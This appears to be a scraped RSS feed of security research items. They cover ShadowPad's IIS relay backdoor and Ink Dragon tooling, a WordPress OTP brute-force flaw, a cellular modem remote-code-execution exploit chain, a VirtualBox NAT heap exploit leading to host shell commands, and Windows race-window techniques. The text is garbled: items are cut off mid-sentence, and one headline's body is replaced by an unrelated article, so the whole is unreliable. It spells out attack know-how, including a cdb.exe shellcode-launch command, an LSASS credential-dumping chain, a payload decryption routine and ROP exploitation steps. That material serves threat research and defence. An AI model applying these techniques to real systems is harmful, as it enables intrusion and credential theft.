Where this becomes significantly more strategic is in how the module manages remote peers. The listener can categorize external IP addresses into two functional roles: servers and clients **.** It automatically pairs nodes from each list to relay traffic between them. Once two peers are matched, the compromised host becomes a live forwarding point: data arriving from the “server” side is streamed directly to the “client,” and responses are returned in the same manner, effectively turning the victim into a transparent communication bridge. We observed multiple instances where government entities were inadvertently serving as C2 relays. In some instances, the victim machine is leveraged as a hop, serving as an access node for ShadowPad clients active in other, unrelated target environments. This chaining effect forms a multi-layered mesh of compromised infrastructure, allowing the operator to issue commands to downstream implants without direct communication with them.

Beyond its role in constructing a large-scale external relay network, the ShadowPad IIS module also exposes a conventional internal proxy capability, designed to route commands toward ShadowPad nodes located deeper within the same network. When the attackers need to deliver instructions to implants that do not have direct external reachability, the IIS module simply relays the traffic internally, behaving much like a pivot point inside the compromised environment. This capability is not new in concept, but its integration into a legitimate IIS worker process makes it extremely difficult to distinguish malicious lateral communication from normal internal service traffic.

Beyond the relay logic itself, the module leaves behind an unusually rich forensic artifact: debug strings that document the number of bytes it forwards between external and internal IP addresses. These strings include source, destination, and payload size. During our investigation, this telemetry proved essential in reconstructing the attackers’ communication graph, enabling us to map exactly how commands entered the victim, how they were relayed, and which internal hosts were drawn into the chain. The presence of such granular logging underscores just how central the relay mechanism is to the operator’s workflow: the victim is not merely compromised, but actively repurposed as a communication bridge that keeps the broader ShadowPad infrastructure stitched together.

This architecture enhances stealth and survivability. By routing commands through unrelated victims, the true controlling IP is never exposed, and network defenders have difficulty distinguishing malicious cross-organization traffic from legitimate inter-government or inter-infrastructure communication. Most significantly, every newly compromised perimeter system can be repurposed immediately as another hop, allowing Ink Dragon to expand its operational reach while obscuring both the origin and the direction of command flow.

As we expanded our analysis beyond the initial access vector, a broader toolset began to emerge. Ink Dragon does not operate with a single backdoor or a monolithic framework; instead, the intrusions feature a sequence of purpose-built components that activate at different stages of the operation. What follows is a breakdown of the post-exploitation tooling we recovered, from IIS-embedded ShadowPad modules to debugger-based loaders, credential-harvesting implants, and long-term command-and-control platforms.

**Module Initialization**

The ShadowPad IIS Listener Module deployed in this intrusion is a fully integrated component designed to masquerade as part of the legitimate IIS stack while quietly providing command-and-control and relay capabilities. Its configuration block defines several operational parameters that determine both how it responds to benign web traffic and how it handles attacker-controlled messages. These include a _server type_ string (used in HTTP response headers), a _document root_ path, and a fallback _error page_ path. Even when configuration fields are absent, the module falls back to realistic defaults — `"C:\\inetpub\\wwwroot"`, `"C:\\inetpub\\custerr\\en-US\\404.htm"`, and `"Microsoft-IIS/10.0"`. Those values allow the module to blend seamlessly with a standard Windows Server installation.

The most important part of the configuration is the list of URL patterns the module will intercept. These patterns are stored as wildcard-enabled strings, separated by semicolons, and are used to register listeners via the Windows `HttpAddUrl` API. This API allows the module to attach itself to arbitrary HTTP URL prefixes, including those containing wildcards for hostnames or paths, making the listener hard to detect unless the exact bindings are enumerated at the OS level. Any inbound request matching one of these patterns is captured and passed through the module’s internal decryption and message-parsing routine.

```
def decrypt_first_packet(buf: bytearray, seed: int, length: int): """ buf = bytearray starting at a1->type (first byte = LOBYTE(seed), second = HIBYTE(seed)) length = total length of buffer (rdx) """ count = length - 2 seed_lo = buf[0] seed_hi = buf[1] num = (seed_hi << 8) | seed_lo num &= 0xFFFFFFFF pos = 2 for _ in range(count): hi = (num >> 16) & 0xFFFF num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF buf[pos] ^= num & 0xFF pos += 1 return buf
```

Requests that do not conform to the attacker’s expected encrypted structure are quietly handled as normal IIS traffic: static files are served from the configured webroot folder when available, and legitimate error pages are returned otherwise. This fallback behavior ensures the listener remains operationally stealthy, presenting a legitimate façade while still acting as a covert interception point.

Once a request passes the module’s URL‑matching, decryption, and structural checks, the ShadowPad IIS Listener evaluates the embedded command ID. These commands fall into two broad categories, both of which are handled by the same component.

The first category contains the instructions responsible for building and maintaining the distributed relay network. These include commands that register an endpoint as a “server,” commands that register an endpoint as a “client,” and the logic that pairs nodes, forwards traffic, and maintains the two queues that drive the hop‑to‑hop communication model.

The second category is entirely separate in purpose: a full backdoor command set enabling the operator to interact directly with the local system. These commands cover host reconnaissance, file operations, data collection, payload staging, configuration updates, process control, and network‑level actions. In other words, the same module responsible for linking compromised machines into a cross‑victim relay chain is also fully capable of operating as a traditional ShadowPad backdoor on that same host.

The most strategically significant capability lies in the module’s role in building and maintaining the operator’s distributed relay network. The IIS Listener maintains two concurrent registries of peers: a server list and a client list. Nodes can add themselves to either list via dedicated command IDs. Entries in the server list are periodically revalidated every 30 seconds, and the module issues acknowledgments to confirm ongoing availability. Nodes placed into the client list behave differently; if a client remains unpaired for 30 seconds, it is automatically pruned to prevent stale links.

Whenever a new node is inserted into one of the lists and the Listener detects that both lists contain at least one live entry, it pairs the first server node with the first client node. At that moment, it sends the server the victim’s IP address. After this handshake, the module establishes bidirectional relaying between the two sockets, shuttling each packet from server → client and client → server with no further processing. The result is a fully transparent hop that allows an upstream operator to deliver commands to a downstream client without ever interacting with that client directly.

The IIS Listener Module of ShadowPad also includes features of the ShadowPad client, letting the attackers run different commands on the IIS machine. This embedded command set provides the operator with extensive control over the compromised host, enabling everything from reconnaissance to interactive access to payload staging.

The breadth of these command IDs illustrates how ShadowPad’s IIS Listener is more than a simple traffic forwarder; it is a self-contained control surface capable of both maintaining the distributed relay network and exerting fine-grained control over any machine running it. This duality is central to Ink Dragon’s operational philosophy: relay-capable nodes double as fully functional access points, allowing the operator to maintain stealthy persistence, collect intelligence, deploy additional tooling, and issue high-privilege instructions without ever exposing their true command infrastructure.

ShadowPad’s backdoor exposes a broad command surface designed to give operators full, hands-on control of a compromised system. It begins with basic orchestration capabilities, retrieving the full command map, gathering a detailed system snapshot, launching an interactive reverse shell, or cleanly shutting down the implant when needed. From there, the malware offers an extensive file-management layer that can enumerate drives, walk directories, manipulate timestamps, create or remove files and folders, and read, write, move, or download data on demand. This is complemented by rich process and service control, allowing operators to list and kill processes, inspect loaded modules, and start, stop, or delete Windows services with the same precision seen in legitimate administration tools.

ShadowPad also supports multiple execution models, including running commands with output capture, spawning interactive console processes with full screen-buffer access, and maintaining long-lived execution channels through pipes. The networking side is equally capable: the implant can inspect local TCP/UDP tables, alter network entries, and even serve as a pivot point by proxying or tunneling traffic through the infected host. In practice, these capabilities turn the backdoor into a complete remote operations platform that blends system administration, espionage tooling, and covert tunneling into a single, tightly integrated module.

**ShadowPad** is a modular, multi-layered backdoor framework widely attributed to Chinese state-sponsored threat groups and frequently used in long-term espionage campaigns. ShadowPad allows operators to deploy customized modules for data exfiltration, credential harvesting, and lateral movement.

In Ink Dragon’s operations, we observed numerous ShadowPad deployments following a recurring triad sideloading structure: an executable, a malicious DLL, and an encrypted TMP payload. The legitimate or masqueraded executable loads the malicious DLL, which in turn decrypts and executes the ShadowPad core from the TMP file directly in memory, erasing the payload afterward to minimize forensic artifacts.

A notable detail in Ink Dragon’s ShadowPad loader is that many of the malicious DLLs across different incidents shared the same generic name, `DLL.dll`. The DLL loaders were MFC-based binaries, where the malicious code was heavily obfuscated using ScatterBrain.

Once executed, these loaders perform on-the-fly decryption of configuration data and payloads stored in the same directory.

One of Ink Dragon’s most distinctive TTPs is leveraging the Microsoft debugger ( `cdb.exe`) as an execution host.

Rather than launching a typical EXE, the operator runs a WinDbg/CDB scripted session, such as: `c:\users\public\cdb.exe -cf C:\Users\Public\config.ini -o C:\Users\Public\cdb.exe`.

The shipped `config.ini` is not an innocuous INI file. It contains a sequence of memory-edit / write-bytes commands followed by a change to the instruction pointer (RIP) so execution continues at the attacker-controlled shellcode. The shellcode, in turn, reads an auxiliary file ( `wmsetup.log`) from disk, decrypts it with an AES key hard-coded into the shellcode, and loads the real payload into memory for execution. After the payload runs, the debugger instance and helper files are often removed, leaving only transient memory-resident code.

**LalsDumper** is Ink Dragon’s in-house LSASS extraction chain observed during multiple intrusions. The sequence starts with a small loader ( `lals.exe`) that manipulates a companion DLL ( `fdp.dll`) in the same folder. The loader locates a placeholder (32 ‘d’ characters) inside `fdp.dll`, overwrites that placeholder with the path to an auxiliary file ( `rtu.txt`), and produces a patched DLL named `nfdp.dll`.

Crucially, the loader calls `AddSecurityPackageA` to register the DLL as a Security Support Provider **(** SSP **)** so that `lsass.exe` will load it, a technique that forces LSASS itself to load attacker code in-process.

The registered DLL reads `rtu.txt`, applies a simple XOR with `0x20` to recover a secondary payload, and then maps that payload into memory. The payload implements a custom `MiniDumpWriteDump`-like routine (not using the Windows API directly) to create a compressed dump of `lsass.exe`, writing a ZIP-like dump file named `<%TEMP%>\]]></content:encoded></item><item><title>Microsoft to block Exchange Online access for outdated mobile devices</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-to-block-exchange-online-access-for-outdated-mobile-devices/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 16 Dec 2025 12:53:25 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft announced on Monday that it will soon block mobile devices running outdated email software from accessing Exchange Online services until they're updated.

Early reactions are mixed: some users express disappointment and frustration, others seem largely indifferent because they already rely on alternatives, and a small group feels relieved that the worry‑inducing alerts will disappear.All those sentiments are understandable. Knowing that someone found your information on the dark web does not automatically make you safer. You cannot simply log into a dark market forum and ask criminals to delete or return your data.But there is value in knowing what’s out there, because it can help you respond to the situation before problems escalate. That’s where dark web and data exposure tools show their use: they turn vague fear (“Is my data out there?”) into specific risk (“This email and password are in a breach.”).The dark web is often portrayed as a shady corner of the internet where stolen data circulates endlessly, and to some extent, that’s accurate. Password dumps, personal records, social security numbers (SSNs), and credit card details are traded for profit. Once combined into massive credential and identity databases accessible to cybercriminals, this information can be used for account takeovers, phishing, and identity fraud.There are no tools to erase critical information that is circulating on dark web forums but that was never really the promise.Google says it is shifting its focus towards “tools that give you more actionable steps,” like Password Manager, Security Checkup, and Results About You. Without doubt, those tools help, but they work better when users understand why they matter. Discontinuing dark web report removes a simple visibility feature, but it also reminds users that cybersecurity awareness means staying careful on the open web and understanding what attackers might use against them.How can Malwarebytes help?The real value comes from three actions: being aware of the exposure, cutting off easy new data sources, and reacting quickly when something goes wrong.This is where dedicated security tools can help you. Malwarebytes Personal Data Remover assists you in discovering and removing your data from data broker sites (among others), shrinking the pool of information that can be aggregated, resold, or used to profile you. Our Digital Footprint scan gives you a clearer picture of where your data has surfaced online, including exposures that could eventually feed into dark web datasets. Malwarebytes Identity Theft Protection adds ongoing monitoring and recovery support, helping you spot suspicious use of your identity and get expert help if someone tries to open accounts or take out credit in your name.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline.

The WPCOM Member plugin for WordPress is vulnerable to authentication bypass via brute force in all versions up to, and including, 1.7.16. This is due to weak OTP (One-Time Password) generation using only 6 numeric digits combined with a 10-minute validity window and no rate limiting on verification attempts. This makes it possible for unauthenticated attackers to brute-force the verification code and authenticate as any user, including administrators, if they know the target's phone number, and the target does not notice or ignores the SMS notification with the OTP.

All of a sudden, the massive multimedia display fills with Doom, the iconic 3D shooter game. It completely replaces the navigation map or the controls menu, and you realize someone is playing it remotely right now. This is not a dream or an overactive imagination – we’ve demonstrated that it’s a perfectly realistic scenario in today’s world.The internet of things now plays a significant role in the modern world. Not only are smartphones and laptops connected to the network, but also factories, cars, trains, and even airplanes. Most of the time, connectivity is provided via 3G/4G/5G mobile data networks using modems installed in these vehicles and devices. These modems are increasingly integrated into a System-on-Chip (SoC), which uses a Communication Processor (CP) and an Application Processor (AP) to perform multiple functions simultaneously. A general-purpose operating system such as Android can run on the AP, while the CP, which handles communication with the mobile network, typically runs on a dedicated OS. The interaction between the AP, CP, and RAM within the SoC at the microarchitecture level is a “black box” known only to the manufacturer – even though the security of the entire SoC depends on it.Bypassing 3G/LTE security mechanisms is generally considered a purely academic challenge because a secure communication channel is established when a user device (User Equipment, UE) connects to a cellular base station (Evolved Node B, eNB). Even if someone can bypass its security mechanisms, discover a vulnerability in the modem, and execute their own code on it, this is unlikely to compromise the device’s business logic. This logic (for example, user applications, browser history, calls, and SMS on a smartphone) resides on the AP and is presumably not accessible from the modem.To find out, if that is true, we conducted a security assessment of a modern SoC, Unisoc UIS7862A, which features an integrated 2G/3G/4G modem. This SoC can be found in various mobile devices by multiple vendors or, more interestingly, in the head units of modern Chinese vehicles, which are becoming increasingly common on the roads. The head unit is one of a car’s key components, and a breach of its information security poses a threat to road safety, as well as the confidentiality of user data.During our research, we identified several critical vulnerabilities at various levels of the Unisoc UIS7862A modem’s cellular protocol stack. This article discusses a stack-based buffer overflow vulnerability in the 3G RLC protocol implementation (CVE-2024-39432). The vulnerability can be exploited to achieve remote code execution at the early stages of connection, before any protection mechanisms are activated.Importantly, gaining the ability to execute code on the modem is only the entry point for a complete remote compromise of the entire SoC. Our subsequent efforts were focused on gaining access to the AP. We discovered several ways to do so, including leveraging a hardware vulnerability in the form of a hidden peripheral Direct Memory Access (DMA) device to perform lateral movement within the SoC. This enabled us to install our own patch into the running Android kernel and execute arbitrary code on the AP with the highest privileges. Details are provided in the relevant sections.Acquiring the modem firmwareThe modem at the center of our research was found on the circuit board of the head unit in a Chinese car.Circuit board of the head unitDescription of the circuit board components:Number in the board photoRealtek RTL8761ATV 802.11b/g/n 2.4G controller with wireless LAN (WLAN) and USB interfaces (USB 1.0/1.1/2.0 standards)SPRD UMW2652 BGA WiFi chipSPRD SR3595D (Unisoc) radio frequency transceiverTechpoint TP9950 video decoderBIWIN BWSRGX32H2A-48G-X internal storage, Package200-FBGA, ROM Type – Discrete, ROM Size – LPDDR4X, 48GSCY E128CYNT2ABE00 EMMC 128G/JEDEC memory cardSPREADTRUM UMP510G5 power controllerFEI.1s LE330315 USB2.0 shunt chipSCT2432STER synchronous step-down DC-DC converter with internal compensationUsing information about the modem’s hardware, we desoldered and read the embedded multimedia memory card, which contained a complete image of its operating system. We then analyzed the image obtained.Remote access to the modem (CVE-2024-39431)The modem under investigation, like any modern modem, implements several protocol stacks: 2G, 3G, and LTE. Clearly, the more protocols a device supports, the more potential entry points (attack vectors) it has. Moreover, the lower in the OSI network model stack a vulnerability sits, the more severe the consequences of its exploitation can be. Therefore, we decided to analyze the data packet fragmentation mechanisms at the data link layer (RLC protocol).We focused on this protocol because it is used to establish a secure encrypted data transmission channel between the base station and the modem, and, in particular, it is used to transmit higher-layer NAS (Non-Access Stratum) protocol data. NAS represents the functional level of the 3G/UMTS protocol stack. Located between the user equipment (UE) and core network, it is responsible for signaling between them. This means that a remote code execution (RCE) vulnerability in RLC would allow an attacker to execute their own code on the modem, bypassing all existing 3G communication protection mechanisms.The RLC protocol uses three different transmission modes: Transparent Mode (TM), Unacknowledged Mode (UM), and Acknowledged Mode (AM). We are only interested in UM, because in this mode the 3G standard allows both the segmentation of data and the concatenation of several small higher-layer data fragments (Protocol Data Units, PDU) into a single data link layer frame. This is done to maximize channel utilization. At the RLC level, packets are referred to as Service Data Units (SDU).Among the approximately 75,000 different functions in the firmware, we found the function for handling an incoming SDU packet. When handling a received SDU packet, its header fields are parsed. The packet itself consists of a mandatory header, optional headers, and data. The number of optional headers is not limited. The end of the optional headers is indicated by the least significant bit (E bit) being equal to 0. The algorithm processes each header field sequentially, while their E-bits equal 1. During processing, data is written to a variable located on the stack of the calling function. The stack depth is 0xB4 bytes. The size of the packet that can be parsed (i.e., the number of headers, each header being a 2-byte entry on the stack) is limited by the SDU packet size of 0x5F0 bytes.As a result, exploitation can be achieved using just one packet in which the number of headers exceeds the stack depth (90 headers). It is important to note that this particular function lacks a stack canary, and when the stack overflows, it is possible to overwrite the return address and some non-volatile register values in this function. However, overwriting is only possible with a value ending in one in binary (i.e., a value in which the least significant bit equals 1). Notably, execution takes place on ARM in Thumb mode, so all return addresses must have the least significant bit equal to 1. Coincidence? Perhaps.In any case, sending the very first dummy SDU packet with the appropriate number of “correct” headers caused the device to reboot. However, at that moment, we had no way to obtain information on where and why the crash occurred (although we suspect the cause was an attempt to transfer control to the address 0xAABBCCDD, taken from our packet).Gaining persistence in the systemThe first and most important observation is that we know the pointer to the newly received SDU packet is stored in register R2. Return Oriented Programming (ROP) techniques can be used to execute our own code, but first we need to make sure it is actually possible.We utilized the available AT command handler to move the data to RAM areas. Among the available AT commands, we found a suitable function – SPSERVICETYPE.Next, we used ROP gadgets to overwrite the address 0x8CE56218 without disrupting the subsequent operation of the incoming SDU packet handling algorithm. To achieve this, it was sufficient to return to the function from which the SDU packet handler was called, because it was invoked as a callback, meaning there is no data linkage on the stack. Given that this function only added 0x2C bytes to the stack, we needed to fit within this size.Stack overflow in the context of the operating systemHaving found a suitable ROP chain, we launched an SDU packet containing it as a payload. As a result, we saw the output 0xAABBCCDD in the AT command console for SPSERVICETYPE. Our code worked!Next, by analogy, we input the address of the stack frame where our data was located, but it turned out not to be executable. We then faced the task of figuring out the MPU settings on the modem. Once again, using the ROP chain method, we generated code that read the MPU table, one DWORD at a time. After many iterations, we obtained the following table.The table shows what we suspected – the code section is only mapped for execution. An attempt to change the configuration resulted in another ROP chain, but this same section was now mapped with write permissions in an unused slot in the table. Because of MPU programming features, specifically the presence of the overlap mechanism and the fact that a region with a higher ID has higher priority, we were able to write to this section.All that remained was to use the pointer to our data (still stored in R2) and patch the code section that had just been unlocked for writing. The question was what exactly to patch. The simplest method was to patch the NAS protocol handler by adding our code to it. To do this, we used one of the NAS protocol commands – MM information. This allowed us to send a large amount of data at once and, in response, receive a single byte of data using the MM status command, which confirmed the patching success.As a result, we not only successfully executed our own code on the modem side but also established full two-way communication with the modem, using the high-level NAS protocol as a means of message delivery. In this case, it was an MM Status packet with the cause field equaling 0xAA.However, being able to execute our own code on the modem does not give us access to user data. Or does it?The full version of the article with a detailed description of the development of an AR exploit that led to Doom being run on the head unit is available on ICS CERT website.]]></content:encoded></item><item><title>Welcome to the new Project Zero Blog</title><link>https://projectzero.google/2025/12/welcome.html</link><author>Natalie Silvanovich</author><category>research</category><pubDate>Tue, 16 Dec 2025 10:00:00 +0000</pubDate><source url="https://projectzero.google/">Google Project Zero</source><content:encoded><![CDATA[While on Project Zero, we aim for our research to be leading-edge, our blog design was … not so much.

I wrote what I intended to be the first half of this post (about escaping from the VM to the VirtualBox host userspace process with CVE-2017-3558), but I never got around to writing the second half (going from the VirtualBox host userspace process to the host kernel), and eventually sorta forgot about this old post draft… But it seems a bit sad to just leave this old draft rotting around forever, so I decided to put it in our blogpost queue now, 8 years after I originally drafted it. I’ve very lightly edited it now (added some links, fixed some grammar), but it’s still almost as I drafted it back then.When you read this post, keep in mind that unless otherwise noted, it is describing the situation as of 2017. Though a lot of the described code seems to not have changed much since then…
VM software typically offers multiple networking modes, including a NAT mode that causes traffic from the VM to appear as normal traffic from the host system. Both QEMU and VirtualBox use forks of Slirp for this. Slirp is described as follows on its homepage:Slirp emulates a PPP or SLIP connection over a normal terminal. This is an actual PPP or SLIP link, firewalled for people’s protection. It makes a quick way to connect your Palm Pilot over the Internet via your Unix or Linux box!!! You don’t need to mess around with your /etc/inetd.conf or your /etc/ppp/options on your system.Slirp is a useful basis for VM networking because it can parse raw IP packets (coming from the emulated network adapter) and forward their contents to the network using the host operating system’s normal, unprivileged networking APIs. Therefore, Slirp can run in the host’s userspace and doesn’t need any special kernel support.Both QEMU and VirtualBox don’t directly use the upstream Slirp code, but instead use patched versions where, for example, the feature for setting up port forwards by talking to a magic IP address is removed. Especially in VirtualBox, the Slirp code has been altered a lot.This post describes an issue in VirtualBox and how it can be exploited. Some parts are specific to the host operating system; in those cases, this post focuses on the situation on Linux.The packet heap in VirtualBoxThe VirtualBox version of Slirp uses a custom zone allocator for storing packet data, in particular, incoming ethernet frames. Each NAT network interface has its own zone () with nmbclusters=1024+32*64=3072 chunks of size . The initial freelist of each zone starts at the high-address end of the zone and linearly progresses towards the low-address end.The heap uses inline metadata; each chunk is prefixed with the following structure:Chunks are freed through the methods m_freem -> m_free -> mb_free_ext -> uma_zfree -> uma_zfree_arg -> slirp_uma_free. The  function takes pointers to the real zone structure and to the chunk data as arguments and checks some assertions before calling  as :Next,  is executed: grabs the zone pointer from the chunk header. Because  is compiled out, there is no validation to ensure that this zone pointer points to the actual zone - an attacker who can overwrite the chunk header could cause this method to use an arbitrary zone pointer. Then, the member  of the zone is executed, which, for an attacker who can point  to controlled data, means that an arbitrary method call like this can be executed:({controlled pointer}, {pointer to packet data}, {controlled u32});Because the VirtualBox binary, at least for Linux, is not relocatable and has `memcpy()` in its PLT section, this can be used as a write primitive by using the static address of the PLT entry for  as function address:memcpy(dest={controlled pointer}, src={packet data}, n={controlled u32})This means that, even though the packet heap doesn’t contain much interesting data, a heap memory corruption that affects chunk headers could still be used to compromise the VirtualBox process rather easily.In changeset 23155, the following code was added at the top of , the method that handles incoming IP packets coming from the VM, before any validation has been performed on the IP headers.  points to the buffer structure containing the packet data pointer and the actual length of the packet data,  points to the IP header inside the untrusted packet data.  performs an endianness conversion.This overwrites the trusted buffer length with the contents of the untrusted length field from the IP packet. This is particularly bad because all safety checks assume that m->m_len is correct - these two added lines basically make all following length checks useless.Later, in changeset 59063, the following comment was added on top of those lines:One straightforward way to abuse this issue is to send a small  packet with a large  to the address 10.0.2.3, causing Slirp to send back a larger  with out-of-bounds heap data. However, Slirp validates the correctness of the ICMP checksum, meaning that the attacker has to guess the 16-bit checksum of the out-of-bounds heap data that the attacker is trying to leak. While it is possible to bruteforce this checksum, it is inelegant.
An easier way to leak heap data is to use UDP with the help of a helper machine on the other side of the NAT, e.g. on the internet. UDP has a 16-bit checksum over packet data as well, but unlike ICMP, UDP treats the checksum value 0 as “don’t check the checksum”. Therefore, by sending a UDP packet with checksum 0 and a bogus length in the IP header, it is possible to reliably leak out-of-bounds heap data. Since  can be bigger than the chunk size, this also permits leaking the headers (and contents) of following chunks, disclosing information about the heap state, the heap location and the location of the .The next step is to somehow use the bug to corrupt chunk headers. Most of the code only reads from incoming packets; however, when a packet with IP options arrives in  or , the IP payload (meaning the TCP or UDP packet header and everything following it) is moved over the IP options using :This means that, by sending a TCP or UDP packet with IP options and a bogus length that is bigger than a heap chunk, it is possible to move the packet payload of the following heap chunk over the corresponding heap chunk header.Exploitation: Going up to host userspaceIn this part of the post, I’m going to show how it’s possible to break out of the VM and run arbitrary shell commands on the host system using .Assuming that a sufficiently big portion of the packet heap is unused, the behavior of the allocator can be simplified by allocating all fragmented heap memory, leaving only a pristine freelist that linearly allocates downwards (as shown at the top of the post). Heap chunks can be allocated by sending IP packets with the “more fragments” bit set; such IP packets have to be stored in memory until either the remaining fragments have been received or the maximum number of pending fragments is reached. An attack that is optimized for maximum reliability would probably go a more complex route and use an approach that still works with an arbitrarily fragmented heap.The first step is to place the command that should be given to  in memory and determine at which address it was placed. To do this, assuming that the freelist grows downwards linearly, the attacker can first send an IP fragment containing the shell command (causing the IP fragment to be stored), then send a crafted UDP packet to leak data:(Note:  and  are now pointers on the list of used heap chunks (), not the freelist, and therefore the  pointer points upwards.)While the leaked data does not contain a pointer to the chunk containing the shell command, it contains pointers to the adjacent chunk headers, which can be used to calculate the address of the shell command.The next big step is to figure out the address of . Because there is no PLT entry for , there is no fixed address the attacker can jump to to invoke the function. However, using the contents of the global offset table, an attacker can first compute the offsets between libc symbols and use them to identify the libc version, then use a GOT entry and the known offset of  relative to the address the GOT entry points to in that libc version to compute the address of . Unfortunately, there seems to be no nice way to directly read from the GOT using the bug, so this has to be done in a somewhat ugly way.It is possible to use the bug as a write primitive by calling  as described in the section “The packet heap in VirtualBox”. In general, functions can be called using the bug as follows:First, the attacker places a fake  (zone header) in memory and determines the address of the fake , just like the shell command was placed in memory. Next, the attacker sends a packet containing a fake  (chunk header) and moves it over the real chunk header using an adjacent UDP packet with a bogus length field and with IP options:
The result is a chunk with an attacker-controlled header that points to the fake :
Next, this chunk can be freed by sending a corresponding second IP fragment, causing the member  of the fake  to be called with arguments  (attacker-controlled),  (the data directly behind the fake chunk header) and  (again attacker-controlled).In the case of , one issue here is that the fake IP header must be valid; otherwise, the packet might not be recognized during fragment reassembly. Therefore, only the space that would normally be occupied by the ethernet header (14 bytes long) can be used to store the payload; to write larger payloads, multiple function calls must be made.At this point, using the write primitive, it is possible to leak the GOT contents by overwriting memory as follows (red parts are modified):First, a fake heap chunk header is placed at the start of the GOT, which is writable and at a fixed address. Because after the VirtualBox process has started, only library code is executed, the corruption of the start of the GOT is not a problem. The  pointer of the fake chunk header points to a legitimate chunk that is currently in a pristine area of the original freelist. Now, the attacker can overwrite the freelist head pointer  in the zone header, causing the fake chunk in the GOT to be returned by a legitimate future allocation.At this point, the attacker can send another UDP packet with a bogus length field in the IP header. This UDP packet will be placed at the start of the GOT, and out-of-bounds data behind the packet will leak - in other words, the remaining normal GOT entries.At this point, the attacker can determine the location of  and call  with a fully controlled argument.Conclusion [from the future]As I noted in the introduction, none of the relevant code seems to have changed much since I found this bug in 2017 - I think if you found a similar bug in the VirtualBox networking code today, it would likely still be exploitable in a similar way.VirtualBox uses a separate memory region for packet memory allocations - that’s probably intended as a performance optimization. This implementation choice should also make it harder to exploit packet memory UAF bugs as a side effect, since no packets contain pointers, kind of like PartitionAlloc or kalloc_type. However, it might still be possible to exploit a packet memory UAF as TOCTOU by making use of an already-validated length value or such.
This could have also made it harder to exploit packet memory linear OOB write bugs - but the choice of using inline metadata, and not protecting against corruption of this metadata at all, makes OOB write bugs in this allocator region highly exploitable.]]></content:encoded></item><item><title>Industry Shockwave?

However, in the end it was published separately in the journal PoC||GTFO issue #13 as well as in the second volume of the printed version. In honor of our new blog we’re republishing it on this blog and included an updated analysis to see if it still works on a modern Windows 11 system.During my Windows research I tend to find quite a few race condition vulnerabilities. A fairly typical exploitable form look something like this:If you can change the state of the system between steps 1 and 3 you might be able to bypass a security check or cause other security issues. The big problem is the race window is generally extremely short. In some cases it might be exploitable by running an exploit enough times and hope you hit it at least once. In other cases you might have one shot at success, if you can’t guarantee you’ll win the race every time it might be effectively unexploitable (however, that’s not to say you shouldn’t report it to the vendor anyway).Over the years I’ve come up with various techniques to expand the race window, including file Opportunistic Locks and trapping virtual memory access. However, those techniques are not always appropriate, so I wanted to find a way of increasing the time window to win the race in cases where the code accesses a resource we control. Specifically, we’re going to attack the lookup process for a named resource. The following is an overview of my thought process to come up with a working solution.Hidden under the hood of Windows NT is the Object Manager Namespace (OMNS). You wouldn’t typically interact with it directly, the Win32 API for the most part hides it away. The NT kernel defines a set of objects, such as Files, Events, Registry Keys, which can all have a name associated with the object. The OMNS provides the means to lookup these named objects. It acts like a file system, so for example you can specify a path to an NT system call such as \BaseNamedObjects\MyEvent and an event object can be looked up and opened.There are two special object types which are for use in the OMNS, Object Directories and Symbolic Links. Object Directories act as named containers for other objects, whereas Symbolic Links allow a name to be redirected to another OMNS path. Symbolic Links are used quite a lot, for example the Windows drive letters are really a symbolic link to the real volume device object. When we call an NT system call the kernel must lookup the entire path, following any symbolic links until it reaches the named object, or fails to find a match.To create a useful exploitation technique, we want to make the process of looking up a resource we control as slow as possible. For example, if we could make it take 1 or 2 seconds, then we’ve got a massive window of opportunity to win the race condition. Therefore, I want to find a way of manipulating the Object Manager lookup process in such a way that we achieve this goal.A note about the testing setup: all tests will open a named event object, which is simulating step 2 in the previous list of exploitable operations. The system used is a new Surface Pro 11th Edition CoPilot+ PC with a Snapdragon X Elite running at 3.40GHz. This system has Windows 11 24H2 installed, however from what I can tell, no AI feature was harmed in the making of these results.First, let’s just measure the time it takes to do a normal lookup. To try and minimize overhead, we’ll write the test in C++ as follows. It creates a named event, then opens the event with a specified number of iterations. Finally it’ll return the time in μs that a single iteration took based on the measurement from the QueryPerformanceCounter API. I’ve not included the support classes in the listing, that’ll be available in the project I’ll link to later.For the test I’ll pick a simple unique name, such as \BaseNamedObjects\MyEvent. With an iteration count of 1000 the results on my test system are probably what we’d expect, the lookup process for a simple named event is approximately 2μs. That includes the system call transition, lookup process and the access check on the event object.While, in theory, you could win a race with this amount of time, it seems pretty unlikely, even on a multicore processor. So let’s think about a way of improving the lookup time (and when I say “improve” I mean making the lookup time slower). We can immediately consider two similar approaches:Make a path which contains one very long name. The lookup process would have to compare the entire name using a string comparison operation to verify it’s accessing the correct object. This should take linear time relative to the length of the string, even if the comparison operation is heavily optimized.Make multiple small named directories and recurse. E.g. . The assumption here is that each lookup takes a fixed amount of time to complete. The operation should again be linear time relative to the depth of recursion of the directories.At this point we’ve not had to look at any actual kernel code, and we’ll not start quite yet, so instead more empirical testing seems the way to go. Let’s start with the first approach, making a long string and performing a lookup on it.How long can the path string be? An object manager path is limited to the maximum string size afforded by the  structure.We can see that the  member is a  which is an unsigned 16 bit integer, this limits the maximum length to 2 - 1. This, however, is a byte count so in fact this limits us to 2 - 1 or 32767 wide characters. We’ll need to be able to make the object in a writable directory such as  which reduces the length slightly, but not enough to make a significant impact. Therefore we’ll open the event object through names between 1 character and 32000 characters in length using the following code:The results are shown below:
While it’s a little noisy it seems like the assumption of a linear lookup time is correct. The longer the string, the longer it takes to look it up. For a 32000 character long string this seems to top out at approximately 35μs. Still not enough in my opinion for a useful primitive, but it’s certainly a start.Now let’s look at the recursive directory approach. In this case, the upper bound is around 16000 directories. This is because each path component must contain at least two characters, a backslash and a single character name (e.g. ). Therefore our maximum path limit is halved. Of course we’d make the assumption that the time to go through the lookup process is going to be greater than the time it takes to compare 4 unicode characters, but let’s test to make sure.The results are shown below:
